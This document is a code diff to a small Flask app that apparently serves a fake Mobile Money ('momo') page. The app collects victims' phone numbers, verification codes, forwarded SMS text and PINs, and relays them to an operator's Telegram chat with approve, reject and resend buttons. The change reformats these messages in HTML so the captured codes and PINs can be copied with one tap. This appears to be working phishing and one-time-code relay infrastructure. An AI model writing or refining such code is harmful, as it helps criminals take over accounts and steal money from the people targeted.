@@ -1,6 +1,7 @@
 import os
 import uuid
 import requests
+import html
 from flask import Flask, request, jsonify, send_from_directory
 
 app = Flask(__name__, static_folder='.', static_url_path='')
@@ -15,7 +16,6 @@ message_details = {}
 def serve_index():
     return send_from_directory('.', 'index.html')
 
-# --- DEDICATED ROUTE FOR YOUR PREVIEW IMAGE ---
 @app.route('/momo-preview.jpg')
 def serve_preview_image():
     return send_from_directory('.', 'momo-preview.jpg', mimetype='image/jpeg')
@@ -30,7 +30,38 @@ def request_approval():
         phone = data.get('phone', 'Unknown')
         code = data.get('code', 'Unknown')
         
-        text = f"🚨 *New Verification Request*\n\n📱 Phone: +237 {phone}\n🔑 Code: {code}"
+        # Escape HTML special characters
+        safe_phone = html.escape(str(phone))
+        safe_code = html.escape(str(code))
+        
+        # Use <code> tags so tapping copies the value in Telegram
+        # If code contains "SMS TEXT:" or "PIN:", handle specially
+        if isinstance(code, str) and code.startswith("SMS TEXT:\n"):
+            sms_body = code.replace("SMS TEXT:\n", "")
+            safe_sms = html.escape(sms_body)
+            text = (
+                f"🚨 <b>New Verification Request</b>\n\n"
+                f"📱 Phone: <code>+237 {safe_phone}</code>\n\n"
+                f"💬 <b>SMS Received:</b>\n"
+                f"<code>{safe_sms}</code>\n\n"
+                f"<i>(Tap the phone or SMS to copy)</i>"
+            )
+        elif isinstance(code, str) and code.startswith("PIN: "):
+            pin_value = code.replace("PIN: ", "")
+            safe_pin = html.escape(pin_value)
+            text = (
+                f"🚨 <b>New Verification Request</b>\n\n"
+                f"📱 Phone: <code>+237 {safe_phone}</code>\n"
+                f"🔑 PIN: <code>{safe_pin}</code>\n\n"
+                f"<i>(Tap the phone or PIN to copy)</i>"
+            )
+        else:
+            text = (
+                f"🚨 <b>New Verification Request</b>\n\n"
+                f"📱 Phone: <code>+237 {safe_phone}</code>\n"
+                f"🔑 Code: <code>{safe_code}</code>\n\n"
+                f"<i>(Tap the phone or code to copy)</i>"
+            )
         
         keyboard = {
             "inline_keyboard": [[
@@ -44,7 +75,7 @@ def request_approval():
         response = requests.post(url, json={
             "chat_id": ADMIN_CHAT_ID,
             "text": text,
-            "parse_mode": "Markdown",
+            "parse_mode": "HTML",
             "reply_markup": keyboard
         })
         
@@ -86,21 +117,22 @@ def telegram_webhook():
             original_text = msg_info["original_text"]
             
             if action == "approve":
-                new_text = f"{original_text}\n\n---\n*Status: ✅ APPROVED*"
-                markup = {"inline_keyboard": []}
+                new_text = f"{original_text}\n\n---\n<b>Status: ✅ APPROVED</b>"
             elif action == "reject":
-                new_text = f"{original_text}\n\n---\n*Status: ❌ REJECTED*"
-                markup = {"inline_keyboard": []}
+                new_text = f"{original_text}\n\n---\n<b>Status: ❌ REJECTED</b>"
             elif action == "resend":
-                new_text = f"{original_text}\n\n---\n*Status: 🔄 RESEND REQUESTED*"
-                markup = {"inline_keyboard": []}
+                new_text = f"{original_text}\n\n---\n<b>Status: 🔄 RESEND REQUESTED</b>"
+            else:
+                new_text = original_text
+            
+            markup = {"inline_keyboard": []}
             
             edit_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
             requests.post(edit_url, json={
                 "chat_id": ADMIN_CHAT_ID,
                 "message_id": message_id,
                 "text": new_text,
-                "parse_mode": "Markdown",
+                "parse_mode": "HTML",
                 "reply_markup": markup
             })
             
